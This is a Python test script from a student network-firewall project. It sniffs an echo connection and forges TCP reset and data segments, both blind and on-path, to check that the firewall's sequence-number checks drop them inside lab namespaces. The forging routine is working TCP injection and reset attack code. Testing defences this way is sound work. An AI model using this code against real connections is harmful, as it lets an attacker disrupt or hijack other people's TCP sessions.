#!/usr/bin/env python3
# ============================================================================
# File Name:   inject.py
# Author:      Giselle Wu
# Course:      CS60: Computer Networks
# Assignment:  Final Project: Userspace Stateful Firewall (Tunwall)
# Date:        November 19, 2026
#
# Description: Attacks a live TCP connection through the firewall with forged
#              segments (an RST, or data) posing as the server, and prints what
#              happened to the connection. Used by run_all.sh to test the TCP
#              sequence-number checks (tcpseq.h).
#
# Usage (as root):
#   inject.py server <ip> <port>
#       echo server (run it in the "outside" namespace)
#   inject.py client <ip> <port> <mode>
#       run in the "inside" namespace: connects to the echo server, gets an
#       attacker in the "outside" namespace to forge one segment, and prints
#       the connection's fate:
#         alive   it still echoes, and nothing forged reached the client
#         dead    nothing comes back any more (the firewall dropped the flow)
#         reset   the client got a reset
#         injected  forged data reached the client
#       modes:  blind-rst   an RST half the sequence space away from the
#                           server's real sequence number (any blind guess)
#               blind-data  data a quarter of the sequence space away
#               onpath-rst  an RST at exactly the right sequence number, as
#                           only an attacker who sees the traffic can send
#   inject.py forge <iface> <srv-ip> <srv-port> <cli-ip> <cli-port> <rst|data> <offset>
#       the attacker (run by "client"): waits for the server's next data
#       segment on <iface>, then sends a forged segment from the server at
#       that segment's end + offset
# ============================================================================
import os
import socket
import struct
import subprocess
import sys
import threading

FORGED_DATA = b"INJECTED"


def server(ip, port):
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((ip, port))
    s.listen(16)

    def echo(c):
        with c:
            while True:
                try:
                    d = c.recv(4096)
                except OSError:
                    return
                if not d:
                    return
                c.sendall(d)

    while True:
        c, _ = s.accept()
        threading.Thread(target=echo, args=(c,), daemon=True).start()


def csum(data):
    if len(data) % 2:
        data += b"\0"
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF


def tcp_packet(src, sport, dst, dport, seq, ack, flags, payload=b""):
    s, d = socket.inet_aton(src), socket.inet_aton(dst)
    tcp = struct.pack("!HHIIBBHHH", sport, dport, seq, ack, 5 << 4, flags, 64240, 0, 0)
    pseudo = s + d + struct.pack("!BBH", 0, 6, len(tcp) + len(payload))
    tcp = tcp[:16] + struct.pack("!H", csum(pseudo + tcp + payload)) + tcp[18:]
    total = 20 + len(tcp) + len(payload)
    ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, total, 0x4242, 0, 64, 6, 0, s, d)
    ip = ip[:10] + struct.pack("!H", csum(ip)) + ip[12:]
    return ip + tcp + payload


def forge(iface, srv, sport, cli, cport, kind, offset):
    """Sniff the server's next data segment to the client, then forge one."""
    sniff = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
    sniff.bind((iface, 0))
    sniff.settimeout(5)
    print("ready", flush=True)
    want = (socket.inet_aton(srv), socket.inet_aton(cli), sport, cport)
    while True:
        frame = sniff.recv(65535)
        if len(frame) < 54 or frame[12:14] != b"\x08\x00":
            continue
        ip = frame[14:]
        ihl = (ip[0] & 15) * 4
        if ip[9] != 6 or (ip[12:16], ip[16:20]) != want[:2]:
            continue
        t = ip[ihl:]
        sp, dp, seq, ack = struct.unpack("!HHII", t[:12])
        plen = struct.unpack("!H", ip[2:4])[0] - ihl - (t[12] >> 4) * 4
        if (sp, dp) == want[2:] and plen > 0:
            break
    nxt = (seq + plen + offset) & 0xFFFFFFFF
    if kind == "rst":
        pkt = tcp_packet(srv, sport, cli, cport, nxt, 0, 0x04)
    else:
        pkt = tcp_packet(srv, sport, cli, cport, nxt, ack, 0x18, FORGED_DATA)
    raw = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    raw.sendto(pkt, (cli, 0))
    print("sent", flush=True)


MODES = {"blind-rst": ("rst", 0x80000000), "blind-data": ("data", 0x40000000),
         "onpath-rst": ("rst", 0)}


def client(ip, port, mode):
    kind, offset = MODES[mode]
    c = socket.create_connection((ip, port), timeout=3)
    cip, cport = c.getsockname()
    attacker = subprocess.Popen(
        ["ip", "netns", "exec", "outside", sys.executable, os.path.abspath(__file__),
         "forge", "veth-sout", ip, str(port), cip, str(cport), kind, str(offset)],
        stdout=subprocess.PIPE, text=True)
    if attacker.stdout.readline().strip() != "ready":
        print("error: attacker did not start")
        return
    c.sendall(b"a")                       # the echo is what the attacker sniffs
    got = c.recv(64)
    sent = attacker.stdout.readline().strip() == "sent"
    attacker.wait(timeout=10)
    if got != b"a" or not sent:
        print("error: setup failed (echo %r, forged %s)" % (got, sent))
        return
    threading.Event().wait(0.5)           # let the forged segment arrive
    try:
        c.settimeout(0.5)
        try:
            early = c.recv(64)            # anything already waiting is forged
        except socket.timeout:
            early = None
        if early == b"":
            print("closed")
            return
        c.settimeout(3)
        c.sendall(b"b")
        late = c.recv(64)
    except socket.timeout:
        print("dead")
        return
    except ConnectionResetError:
        print("reset")
        return
    if FORGED_DATA in (early or b"") + late:
        print("injected")
    elif late == b"b":
        print("alive")
    else:
        print("closed" if late == b"" else "error: got %r" % late)


def main():
    cmd = sys.argv[1]
    if cmd == "server":
        server(sys.argv[2], int(sys.argv[3]))
    elif cmd == "client":
        client(sys.argv[2], int(sys.argv[3]), sys.argv[4])
    elif cmd == "forge":
        a = sys.argv
        forge(a[2], a[3], int(a[4]), a[5], int(a[6]), a[7], int(a[8]))
    else:
        sys.exit("usage: see the header of " + sys.argv[0])


main()
